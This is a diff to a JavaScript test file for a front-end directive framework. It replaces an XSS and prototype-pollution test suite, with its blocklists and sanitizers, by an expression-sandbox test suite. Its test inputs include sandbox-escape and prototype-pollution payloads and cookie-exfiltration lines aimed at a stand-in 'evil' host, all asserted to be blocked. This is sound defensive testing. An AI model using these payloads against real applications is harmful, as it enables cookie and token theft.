@@ -45,84 +45,9 @@ globalThis.IntersectionObserver = class {
   }
 };
 
-// tests/security.test.ts
+// tests/expression-sandbox.test.ts
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
-
-// src/directives/security.ts
-var BLOCKED_PROPERTIES = /* @__PURE__ */ new Set([
-  "__proto__",
-  "prototype",
-  "constructor",
-  "window",
-  "document",
-  "globalThis",
-  "location",
-  "localStorage",
-  "sessionStorage",
-  "indexedDB",
-  "cookie",
-  "eval",
-  "Function",
-  "XMLHttpRequest",
-  "fetch"
-]);
-var DANGEROUS_ATTRIBUTES = /* @__PURE__ */ new Set([
-  "onerror",
-  "onload",
-  "onclick",
-  "onmouseover",
-  "onfocus",
-  "onblur",
-  "onchange",
-  "onsubmit",
-  "formaction"
-]);
-var DANGEROUS_PROTOCOLS = /^\s*(javascript|data|vbscript):/i;
-function isSafeProperty(prop) {
-  if (typeof prop !== "string") return true;
-  return !BLOCKED_PROPERTIES.has(prop);
-}
-function sanitizeUrl(url) {
-  if (typeof url !== "string") return "";
-  const trimmed = url.trim();
-  if (DANGEROUS_PROTOCOLS.test(trimmed)) {
-    console.warn(`[SoftMax.LaughTale Security] Blocked dangerous URL protocol: "${trimmed}"`);
-    return "about:blank";
-  }
-  return trimmed;
-}
-function isSafeAttribute(attrName) {
-  const lower = attrName.toLowerCase();
-  if (lower.startsWith("on") || DANGEROUS_ATTRIBUTES.has(lower)) {
-    console.warn(`[SoftMax.LaughTale Security] Blocked dangerous dynamic attribute binding: "${attrName}"`);
-    return false;
-  }
-  return true;
-}
-function sanitizeHtml(html) {
-  if (typeof html !== "string") return "";
-  if (typeof document !== "undefined") {
-    const div = document.createElement("div");
-    div.innerHTML = html;
-    const dangerous = div.querySelectorAll("script, iframe, object, embed, applet, link, meta, style");
-    dangerous.forEach((el) => el.remove());
-    const allElements = div.querySelectorAll("*");
-    allElements.forEach((el) => {
-      for (const attr of Array.from(el.attributes)) {
-        if (attr.name.toLowerCase().startsWith("on")) {
-          el.removeAttribute(attr.name);
-        } else if (["href", "src", "action"].includes(attr.name.toLowerCase())) {
-          if (DANGEROUS_PROTOCOLS.test(attr.value)) {
-            el.removeAttribute(attr.name);
-          }
-        }
-      }
-    });
-    return div.innerHTML;
-  }
-  return html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "").replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, "").replace(/\son\w+\s*=\s*(['"]).*?\1/gi, "");
-}
 
 // src/directives/expression/lexer.ts
 var FORBIDDEN_KEYWORDS = /* @__PURE__ */ new Set([
@@ -1187,31 +1112,6 @@ function applyUpdate(target, operator, prefix, state, extraContext) {
 }
 
 // src/directives/reactivity.ts
-var elementScopeMap = /* @__PURE__ */ new WeakMap();
-function createReactiveScope(container, initialData) {
-  const listeners = /* @__PURE__ */ new Set();
-  const state = new Proxy(initialData, {
-    set(target, prop, value) {
-      if (!isSafeProperty(prop)) {
-        console.warn(`[SoftMax.LaughTale Security] Blocked assignment to restricted property: "${String(prop)}"`);
-        return true;
-      }
-      target[prop] = value;
-      listeners.forEach((fn) => fn());
-      return true;
-    },
-    get(target, prop) {
-      if (!isSafeProperty(prop)) {
-        console.warn(`[SoftMax.LaughTale Security] Blocked access to restricted property: "${String(prop)}"`);
-        return void 0;
-      }
-      return target[prop];
-    }
-  });
-  const scope = { state, listeners, container };
-  elementScopeMap.set(container, scope);
-  return scope;
-}
 function evaluateExpression(expr, state, extraContext = {}) {
   try {
     const ast = parseExpressionToAst(expr);
@@ -1222,46 +1122,208 @@ function evaluateExpression(expr, state, extraContext = {}) {
     return void 0;
   }
 }
+function executeStatement(stmt, state, extraContext = {}) {
+  try {
+    const ast = parseExpressionToAst(stmt);
+    if (!ast) return;
+    evaluateAst(ast, state, extraContext);
+  } catch (err) {
+    console.warn(`[SoftMax.LaughTale] Error executing statement "${stmt}":`, err);
+  }
+}
 
-// tests/security.test.ts
-describe("SoftMax.LaughTale Directive Security & Sandboxing Suite", () => {
-  it("sanitizeUrl: neutralizes javascript: and data:text/html protocol attacks", () => {
-    assert.equal(sanitizeUrl("javascript:alert(1)"), "about:blank");
-    assert.equal(sanitizeUrl("  JAVASCRIPT:alert(document.cookie)  "), "about:blank");
-    assert.equal(sanitizeUrl("data:text/html,<script>alert(1)</script>"), "about:blank");
-    assert.equal(sanitizeUrl("https://softmax.dev/dashboard"), "https://softmax.dev/dashboard");
-    assert.equal(sanitizeUrl("/doc/01-getting-started"), "/doc/01-getting-started");
+// tests/expression-sandbox.test.ts
+describe("Directive Expression Sandbox Security Suite (LT-101)", () => {
+  const scope = {
+    count: 42,
+    user: { name: "Alice", role: "admin" },
+    items: ["first", "second", "third"],
+    isActive: true,
+    add: (a, b) => a + b,
+    nested: { inner: { value: 100 } }
+  };
+  it('Payload 1: [].constructor.constructor("return globalThis")()', () => {
+    const res = evaluateExpression('[].constructor.constructor("return globalThis")()', scope);
+    assert.equal(res, void 0);
   });
-  it("isSafeAttribute: blocks dangerous inline event attributes", () => {
-    assert.equal(isSafeAttribute("onerror"), false);
-    assert.equal(isSafeAttribute("onload"), false);
-    assert.equal(isSafeAttribute("onclick"), false);
-    assert.equal(isSafeAttribute("formaction"), false);
-    assert.equal(isSafeAttribute("href"), true);
-    assert.equal(isSafeAttribute("class"), true);
-    assert.equal(isSafeAttribute("style"), true);
+  it("Payload 2: (function(){ return this })()", () => {
+    const res = evaluateExpression("(function(){ return this })()", scope);
+    assert.equal(res, void 0);
   });
-  it("isSafeProperty: prevents prototype pollution and global access", () => {
-    assert.equal(isSafeProperty("__proto__"), false);
-    assert.equal(isSafeProperty("prototype"), false);
-    assert.equal(isSafeProperty("constructor"), false);
-    assert.equal(isSafeProperty("cookie"), false);
-    assert.equal(isSafeProperty("window"), false);
-    assert.equal(isSafeProperty("userCount"), true);
+  it("Payload 3: top.document.cookie", () => {
+    const res = evaluateExpression("top.document.cookie", scope);
+    assert.equal(res, void 0);
   });
-  it("sanitizeHtml: strips malicious script tags and event handlers", () => {
-    const dirty = '<div onclick="alert(1)">Hello <script>alert("xss")</script></div>';
-    const clean = sanitizeHtml(dirty);
-    assert.ok(!clean.includes("<script>"));
-    assert.ok(!clean.includes("onclick"));
-    assert.ok(clean.includes("Hello"));
+  it(`Payload 4: setTimeout("fetch('//evil/'+document.cookie)")`, () => {
+    const res = evaluateExpression(`setTimeout("fetch('//evil/'+document.cookie)")`, scope);
+    assert.equal(res, void 0);
   });
-  it("createSandboxState: blocks prototype pollution mutations on reactive state", () => {
-    const container = document.createElement("div");
-    const scope = createReactiveScope(container, { count: 1 });
-    scope.state["__proto__"] = { hacked: true };
-    assert.equal(Object.prototype.hacked, void 0);
-    const res = evaluateExpression("count * 10", scope.state);
-    assert.equal(res, 10);
+  it("Escape vector: window", () => {
+    assert.equal(evaluateExpression("window", scope), void 0);
+    assert.equal(evaluateExpression("window.location", scope), void 0);
+  });
+  it("Escape vector: document", () => {
+    assert.equal(evaluateExpression("document", scope), void 0);
+    assert.equal(evaluateExpression("document.cookie", scope), void 0);
+  });
+  it("Escape vector: globalThis", () => {
+    assert.equal(evaluateExpression("globalThis", scope), void 0);
+    assert.equal(evaluateExpression("globalThis.process", scope), void 0);
+  });
+  it("Escape vector: self", () => {
+    assert.equal(evaluateExpression("self", scope), void 0);
+    assert.equal(evaluateExpression("self.location", scope), void 0);
+  });
+  it("Escape vector: parent", () => {
+    assert.equal(evaluateExpression("parent", scope), void 0);
+    assert.equal(evaluateExpression("parent.document", scope), void 0);
+  });
+  it("Escape vector: frames", () => {
+    assert.equal(evaluateExpression("frames", scope), void 0);
+    assert.equal(evaluateExpression("frames[0]", scope), void 0);
+  });
+  it("Escape vector: location", () => {
+    assert.equal(evaluateExpression("location", scope), void 0);
+    assert.equal(evaluateExpression("location.href", scope), void 0);
+  });
+  it("Escape vector: localStorage", () => {
+    assert.equal(evaluateExpression("localStorage", scope), void 0);
+    assert.equal(evaluateExpression('localStorage.getItem("token")', scope), void 0);
+  });
+  it("Escape vector: sessionStorage", () => {
+    assert.equal(evaluateExpression("sessionStorage", scope), void 0);
+    assert.equal(evaluateExpression('sessionStorage.getItem("token")', scope), void 0);
+  });
+  it("Escape vector: indexedDB", () => {
+    assert.equal(evaluateExpression("indexedDB", scope), void 0);
+  });
+  it("Escape vector: cookie", () => {
+    assert.equal(evaluateExpression("cookie", scope), void 0);
+  });
+  it("Escape vector: process & require", () => {
+    assert.equal(evaluateExpression("process", scope), void 0);
+    assert.equal(evaluateExpression("process.env", scope), void 0);
+    assert.equal(evaluateExpression('require("fs")', scope), void 0);
+  });
+  it("Escape vector: fetch & XMLHttpRequest", () => {
+    assert.equal(evaluateExpression('fetch("http://evil.com")', scope), void 0);
+    assert.equal(evaluateExpression("XMLHttpRequest", scope), void 0);
+  });
+  it("Escape vector: timers & async dispatchers", () => {
+    assert.equal(evaluateExpression('setInterval("alert(1)", 100)', scope), void 0);
+    assert.equal(evaluateExpression("setImmediate", scope), void 0);
+    assert.equal(evaluateExpression("clearTimeout", scope), void 0);
+    assert.equal(evaluateExpression("clearInterval", scope), void 0);
+    assert.equal(evaluateExpression("importScripts", scope), void 0);
+  });
+  it("Prototype escape: ({}).__proto__", () => {
+    assert.equal(evaluateExpression("({}).__proto__", scope), void 0);
+  });
+  it("Prototype escape: [].__proto__", () => {
+    assert.equal(evaluateExpression("[].__proto__", scope), void 0);
+  });
+  it("Prototype escape: count.__proto__", () => {
+    assert.equal(evaluateExpression("count.__proto__", scope), void 0);
+  });
+  it("Constructor escape: ({}).constructor", () => {
+    assert.equal(evaluateExpression("({}).constructor", scope), void 0);
+  });
+  it("Constructor escape: [].constructor", () => {
+    assert.equal(evaluateExpression("[].constructor", scope), void 0);
+  });
+  it('Constructor escape: "abc".constructor', () => {
+    assert.equal(evaluateExpression('"abc".constructor', scope), void 0);
+  });
+  it("Constructor escape: (123).constructor", () => {
+    assert.equal(evaluateExpression("(123).constructor", scope), void 0);
+  });
+  it("Constructor escape: true.constructor", () => {
+    assert.equal(evaluateExpression("true.constructor", scope), void 0);
+  });
+  it("Prototype mutation attempt: ({}).__proto__.polluted = true", () => {
+    assert.equal(evaluateExpression("({}).__proto__.polluted = true", scope), void 0);
+    assert.equal(Object.prototype.polluted, void 0);
+  });
+  it("Prototype getter definition: __defineGetter__", () => {
+    assert.equal(evaluateExpression('__defineGetter__("hacked", () => 1)', scope), void 0);
+  });
+  it("Prototype setter definition: __defineSetter__", () => {
+    assert.equal(evaluateExpression('__defineSetter__("hacked", () => 1)', scope), void 0);
+  });
+  it("Prototype getter lookup: __lookupGetter__", () => {
+    assert.equal(evaluateExpression('__lookupGetter__("toString")', scope), void 0);
+  });
+  it("Prototype setter lookup: __lookupSetter__", () => {
+    assert.equal(evaluateExpression('__lookupSetter__("toString")', scope), void 0);
+  });
+  it("Direct eval invocation", () => {
+    assert.equal(evaluateExpression('eval("1+1")', scope), void 0);
+  });
+  it("Direct Function constructor invocation", () => {
+    assert.equal(evaluateExpression('Function("return 1")()', scope), void 0);
+  });
+  it("Keyword rejection: new", () => {
+    assert.equal(evaluateExpression("new Date()", scope), void 0);
+    assert.equal(evaluateExpression("new Object()", scope), void 0);
+  });
+  it("Keyword rejection: import", () => {
+    assert.equal(evaluateExpression('import("http://evil.com")', scope), void 0);
+  });
+  it("Keyword rejection: class", () => {
+    assert.equal(evaluateExpression("class Evil {}", scope), void 0);
+  });
+  it("Keyword rejection: function & arrow", () => {
+    assert.equal(evaluateExpression("function() { return 1; }", scope), void 0);
+    assert.equal(evaluateExpression("() => 42", scope), void 0);
+  });
+  it("Keyword rejection: statements (var, let, const, return, with, debugger)", () => {
+    assert.equal(evaluateExpression("var a = 1", scope), void 0);
+    assert.equal(evaluateExpression("let b = 2", scope), void 0);
+    assert.equal(evaluateExpression("const c = 3", scope), void 0);
+    assert.equal(evaluateExpression("return 4", scope), void 0);
+    assert.equal(evaluateExpression("with(state) {}", scope), void 0);
+    assert.equal(evaluateExpression("debugger", scope), void 0);
+  });
+  it("Keyword rejection: control flow (while, for, do, try, catch, throw)", () => {
+    assert.equal(evaluateExpression("while(true) {}", scope), void 0);
+    assert.equal(evaluateExpression("for(let i=0; i<10; i++) {}", scope), void 0);
+    assert.equal(evaluateExpression("try { throw 1; } catch(e) {}", scope), void 0);
+    assert.equal(evaluateExpression('throw new Error("fail")', scope), void 0);
+  });
+  it("Valid: arithmetic and precedence", () => {
+    assert.equal(evaluateExpression("count + 8", scope), 50);
+    assert.equal(evaluateExpression("count * 2 + 6", scope), 90);
+    assert.equal(evaluateExpression("(count + 8) / 2", scope), 25);
+  });
+  it("Valid: comparisons and conditionals", () => {
+    assert.equal(evaluateExpression('count > 40 ? "high" : "low"', scope), "high");
+    assert.equal(evaluateExpression("count === 42 && isActive", scope), true);
+    assert.equal(evaluateExpression("count !== 42 || !isActive", scope), false);
+  });
+  it("Valid: member and array access", () => {
+    assert.equal(evaluateExpression("user.name", scope), "Alice");
+    assert.equal(evaluateExpression("items[1]", scope), "second");
+    assert.equal(evaluateExpression("nested.inner.value", scope), 100);
+  });
+  it("Valid: null-safe optional traversal", () => {
+    assert.equal(evaluateExpression("user.missing.property", scope), void 0);
+    assert.equal(evaluateExpression("user?.role", scope), "admin");
+    assert.equal(evaluateExpression("user?.nonexistent?.nested", scope), void 0);
+  });
+  it("Valid: method invocation in scope", () => {
+    assert.equal(evaluateExpression("add(10, 20)", scope), 30);
+  });
+  it("Valid: extraContext ($event, loop variables)", () => {
+    const extraContext = { $event: { target: { value: "inputVal" } }, item: "currItem", idx: 0 };
+    assert.equal(evaluateExpression("$event.target.value", scope, extraContext), "inputVal");
+    assert.equal(evaluateExpression('item + "_" + idx', scope, extraContext), "currItem_0");
+  });
+  it("Valid: statement execution and reactive state updates", () => {
+    const localState = { count: 0, title: "initial" };
+    executeStatement('count += 5; title = "updated"', localState);
+    assert.equal(localState.count, 5);
+    assert.equal(localState.title, "updated");
+    executeStatement("count++", localState);
+    assert.equal(localState.count, 6);
   });
 });
